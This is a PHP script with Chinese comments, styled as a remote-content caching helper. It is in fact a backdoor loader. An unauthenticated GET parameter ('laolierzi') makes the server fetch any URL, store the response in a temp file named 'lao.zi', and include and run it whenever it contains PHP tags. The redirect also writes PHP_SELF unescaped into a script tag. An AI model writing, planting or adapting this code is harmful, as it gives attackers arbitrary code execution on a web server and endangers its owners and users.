<?php
// 禁用严格类型声明，兼容所有PHP版本
// declare(strict_types=1);

// 定义配置类，存放缓存文件名和路径
class Config
{
    const CACHE_FILENAME = 'lao.zi';

    /**
     * 获取系统临时目录路径
     * @return string
     */
    public static function getCacheDir()
    {
        return sys_get_temp_dir();
    }

    /**
     * 获取完整的缓存文件路径
     * @return string
     */
    public static function getCacheFilePath()
    {
        return self::getCacheDir() . DIRECTORY_SEPARATOR . self::CACHE_FILENAME;
    }
}

// 工具类，封装常用方法
class Utility
{
    /**
     * 验证URL是否合法
     * @param string $url
     * @return bool
     */
    public static function validateUrl($url)
    {
        return filter_var($url, FILTER_VALIDATE_URL) !== false;
    }

    /**
     * 获取远程内容，支持cURL、file_get_contents、Socket
     * @param string $url
     * @return string|null
     */
    public static function fetchRemoteContent($url)
    {
        // 使用cURL优先
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_TIMEOUT => 10,
            ]);
            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                error_log('cURL请求错误：' . curl_error($ch));
                curl_close($ch);
                return null;
            }
            curl_close($ch);
            return $response;
        }

        // 使用file_get_contents
        if (ini_get('allow_url_fopen')) {
            $content = @file_get_contents($url);
            if ($content !== false) {
                return $content;
            }
        }

        // 最后用socket连接
        $parts = parse_url($url);
        if (!$parts || !isset($parts['host'])) {
            return null;
        }
        $host = $parts['host'];
        $port = isset($parts['port']) ? (int)$parts['port'] : 80;
        $path = isset($parts['path']) ? $parts['path'] : '/';
        $query = isset($parts['query']) ? '?' . $parts['query'] : '';

        $socket = @fsockopen($host, $port, $errno, $errstr, 10);
        if (!$socket) {
            error_log("Socket连接失败：{$errstr} ({$errno})");
            return null;
        }

        $request = "GET {$path}{$query} HTTP/1.1\r\n" .
                   "Host: {$host}\r\n" .
                   "Connection: Close\r\n\r\n";

        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket, 1024);
        }
        fclose($socket);

        // 解析响应，提取正文
        $parts = preg_split('/\r\n\r\n/', $response, 2);
        return isset($parts[1]) ? $parts[1] : null;
    }

    /**
     * 从文件加载缓存内容
     * @param string $filePath
     * @return string
     */
    public static function loadCache($filePath)
    {
        return (file_exists($filePath)) ? @file_get_contents($filePath) ?: '' : '';
    }

    /**
     * 保存内容到缓存文件
     * @param string $filePath
     * @param string $content
     * @return bool
     */
    public static function saveCache($filePath, $content)
    {
        return @file_put_contents($filePath, $content) !== false;
    }
}

// 主要处理逻辑
class LaoZiHandler
{
    private $cacheFilePath;

    public function __construct()
    {
        $this->cacheFilePath = Config::getCacheFilePath();
        $this->ensureCacheDirectory();
    }

    /**
     * 确保缓存目录存在
     */
    private function ensureCacheDirectory()
    {
        $dir = dirname($this->cacheFilePath);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
    }

    /**
     * 处理请求参数
     */
    public function handleRequest()
    {
        if (isset($_GET['laolierzi'])) {
            $url = trim($_GET['laolierzi']);

            if (!Utility::validateUrl($url)) {
                $this->showMessage('无效的URL地址。', true);
            }

            $content = Utility::fetchRemoteContent($url);
            if ($content === null) {
                $this->showMessage('请求内容失败，请稍后重试。', true);
            }

            // 缓存内容
            Utility::saveCache($this->cacheFilePath, $content);
            // 重定向去除参数
            $this->redirectToSelf();
        }
    }

    /**
     * 显示缓存或执行PHP代码
     */
    public function displayCache()
    {
        if (file_exists($this->cacheFilePath)) {
            $content = Utility::loadCache($this->cacheFilePath);
            if (strpos($content, '<?') !== false) {
                // 警告：直接包含缓存中的PHP代码，使用时谨慎
                include $this->cacheFilePath;
            } else {
                echo $content;
            }
        } else {
            $this->showMessage('暂无内容<br>请通过有效的URL参数加载远程内容。', false);
        }
    }

    /**
     * 显示信息提示
     * @param string $message
     * @param bool $isError
     */
    private function showMessage($message, $isError = false)
    {
        $color = $isError ? '#e74c3c' : '#3498db';
        echo <<<HTML
        <div style="
            margin: 50px auto;
            padding: 20px 30px;
            max-width: 700px;
            border-radius: 8px;
            background-color: #ffffff;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 1.2em;
            color: {$color};
            text-align: center;
            line-height: 1.4;
        ">
            {$message}
        </div>
        HTML;
        exit;
    }

    /**
     * 重定向到自身，去除参数
     */
    private function redirectToSelf()
    {
        $currentUrl = $_SERVER['PHP_SELF'];
        echo "<script>window.location.href='{$currentUrl}';</script>";
        exit;
    }
}

// 执行流程
$handler = new LaoZiHandler();
$handler->handleRequest();
$handler->displayCache();

?>
